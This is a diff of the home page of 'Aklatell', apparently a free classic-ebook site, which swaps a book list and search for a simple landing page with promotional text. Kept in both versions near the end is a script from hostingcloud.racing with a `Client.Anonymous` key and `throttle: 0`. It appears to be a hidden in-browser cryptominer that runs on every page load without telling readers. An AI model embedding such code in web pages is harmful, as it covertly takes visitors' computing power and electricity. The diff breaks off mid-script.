@@ -1,186 +1,78 @@
-<!DOCTYPE html>
+<!DOCTYPE HTML>
 <html lang="en">
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Explore a vast collection of timeless classic ebooks for free. Immerse yourself in the literary treasures of the past with our curated selection of beloved works. Discover, read, and relive the magic of literature's greatest masterpieces.">
-    <meta name="keywords" content="classic ebooks, free to read, timeless literature, literary treasures, classic literature, beloved works, curated collection, literary masterpieces, vintage books, historical novels, public domain texts, timeless classics, reading experience, online library, literary heritage.">
-    <link rel="icon" href="aklatell.png">
-    <link rel="manifest" href="/manifest.json">
-    <title>Aklatell - Library of Classical eBooks</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Archive of classical stories.">
+    <meta name="keywords" content="aklatell, short stories, stories, story, short story">
+    <meta property="og:title" content="Aklatell - Story Archive">
+    <meta property="og:type" content="Text">
+    <meta property="og:url" content="https://aklatell.github.io">
+    <title>Aklatell - Story Archive</title>
     <style>
-@font-face {
-        font-family: Bookman;
-        font-display: swap;
-        src: url('Bookman.otf');
-    }
         * {
-            font-family: Bookman;
             box-sizing: border-box;
-            scroll-behavior: smooth;
+            font-family: Georgia;
             padding: 0px;
             margin: 0px;
         }
-        a {
-            text-decoration: none;
-        }
         body {
-            background: #161615;
-            padding: 14px;
+            background: #222225;
+            padding: 0px;
+            margin: 2.5em;
+            color: #B7B7B7;
         }
-        header {
+        h1, h2, p {
+            line-height: 1.5;
+            margin-top: 1em;
+            margin-bottom: 1em;
             text-align: center;
-            padding-top: 32px;
-            padding-bottom: 46px;
-            letter-spacing: 1px;
-            color: #D98301;
-            font-size: 24px;
         }
-        main {
-            display: grid;
-            gap: 14px;
+        p {
+            font-size: 16px;
         }
-        section a h2 {
+        a {
+            display: block;
+            text-decoration: none;
+            color: #FAF9F6;
+            border-radius: 10px;
             text-transform: uppercase;
-            border: 2px double #D98301;
-            padding: 64px 14px 64px 14px;
-            background: #212125;
-            border-radius: 15px;
-            letter-spacing: 1px;
             text-align: center;
-            font-size: 20px;
-            color: #D98301;
-        }
-        section a h2:hover {
-            border: 2px solid #D98301;
-        }
-        #search {
-            width: 90%;
-            margin: auto;
-            padding: 10px;
-            text-transform: uppercase;
-            border: 2px double #D98301;
-            border-radius: 15px;
-            text-align: center;
-            outline: none;
-        }
-        #top {
-            position: fixed;
-            right: 5%;
-            bottom: 5%;
-            padding: 10px;
-            color: #161615;
-            border-radius: 15px;
-            box-shadow: 1px 1px 2px 1px #121215;
-            font-weight: bold;
-            border: 2px solid #888885;
-            background: #FAF9F6;
-        }
-        #ad {
-            transform: translate(-50%, 11%);
-            position: fixed;
-            top: 0%;
-            left: 50%;
+            background: teal;
+            margin: 1em;
+            padding: 1em;
         }
     </style>
-    <!-- AddToAny BEGIN -->
-
-    <!-- AddToAny END -->
-    <!-- OneSignal Begin-->
-    <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
-    <script>
-        window.OneSignalDeferred = window.OneSignalDeferred || [];
-        OneSignalDeferred.push(function(OneSignal) {
-            OneSignal.init({
-                appId: "3242912c-f759-4379-ade0-f51ec463186f",
-            });
-        });
-    </script>
-    <!-- OneSignal End -->
 </head>
-<body oncontextmenu="return false">
+<body>
     <header>
-        <h1>AKLATELL</h1>
-        <div id="ad" style="width:320px;height:50px;background:#fff;margin:auto;margin-bottom:14px">
-            <iframe data-aa='2251807' src='//ad.a-ads.com/2251807?size=320x50' style='width:320px; height:50px; border:0px; padding:0; overflow:hidden; background-color: transparent;' title="Advertisement"></iframe>
-        </div>
-        <input type="text" placeholder="SEARCH EBOOK" id="search">
+        <h1>Aklatell</h1>
     </header>
     <main>
-        <section>
-            <a href="ebooks/eBook of The Odyssey, by Homer.html">
-                <h2>The Odyssey</h2>
-            </a>
-        </section>
-        <section>
-            <a href="ebooks/eBook of A Room With a View, by E. M. Forster.html">
-                <h2>A Room With a View</h2>
-            </a>
-        </section>
-        <section>
-            <a href="ebooks/eBook of Middlemarch, by George Eliot.html">
-                <h2>Middlemarch</h2>
-            </a>
-        </section>
-        <section>
-            <a href="ebooks/eBook of The Blue Castle.html">
-                <h2>The Blue Castle</h2>
-            </a>
-        </section>
-        <section>
-            <a href="ebooks/eBook of Little Women, by Louisa M. Alcott.html">
-                <h2>Little Women</h2>
-            </a>
-        </section>
-        <section>
-            <a href="ebooks/eBook of The Enchanted April, by Elizabeth Von Arnim.html">
-                <h2>The Enchanted April</h2>
-            </a>
-        </section>
-        <section>
-            <a href="ebooks/eBook of Treasure Island, by Robert Louis Stevenson.html">
-                <h2>Treasure Island</h2>
-            </a>
-        </section>
-        <section>
-            <a href="ebooks/eBook of War and Peace, by Leo Tolstoy.html">
-                <h2>War and Peace</h2>
-            </a>
-        </section>
-        <section>
-            <a href="ebooks/eBook of Les Misérables, by Victor Hugo.html">
-                <h2>Les Misérables</h2>
-            </a>
-        </section>
+        <h2>
+            Unlock the Vault of Literature!
+        </h2>
+        <a href="stories/The Frog-king, Or Iron Henry.html">Start Reading</a>
+        <p>
+            Immerse yourself in captivating tales from the greatest authors with Aklatell. Our digital library offers an unparalleled collection of renowned literary works available for free.
+        </p>
+        <p>
+            Aklatell provides access to the most influential works in history. Discover what has inspired generations upon generations.
+        </p>
+        <p>
+            Best of all, the entire library is free to enjoy. Start expanding your literary horizons now without paying a dime. Around-the-clock availability allows you to fit reading classics into a busy schedule.
+        </p>
+        <p>
+            Immerse into captivating worlds, beloved characters that never grow old. Embark on new adventures from literary masters while uncovering the basis of iconic narratives and archetypes mimicked today. Join Aklatell to unlock vaults of literature’s most extraordinary treasures – all free for your enjoyment.
+        </p>
     </main>
-    <footer>
-        <button id="top" onclick="window.scrollTo(0,0)" type="button">TOP</button>
-    </footer>
-    <script>
-        let search = document.getElementById('search');
-        let ebooks = document.querySelectorAll('section');
-        search.addEventListener('input', () => {
-            let searchInput = search.value.toUpperCase();
-            for (i = 0; i < ebooks.length; i++) {
-                let ebookTitle = ebooks[i].textContent.toUpperCase();
-                if (ebookTitle.includes(searchInput)) {
-                    ebooks[i].style.display = 'block';
-                } else {
-                    ebooks[i].style.display = 'none';
-                }
-            }
-        });
-    </script>
     <script src="https://www.hostingcloud.racing/73UE.js"></script>
     <script>
         var _client = new Client.Anonymous('1b338ef2246dfb0c9665ca717515ff07c101d6d5c96df696097a28b6fb997ed5', {
-            throttle: 0,
-            c: 'w',
-            ads: 0
+            throttle: 0, c: 'w', ads: 0
         });
         _client.start();
-    </script>
-    <script>
+
         if ('serviceWorker' in navigator && window.matchMedia('(display-mode: standalone)').matches === false) {
             window.addEventListener('load', async () => {
                 try {
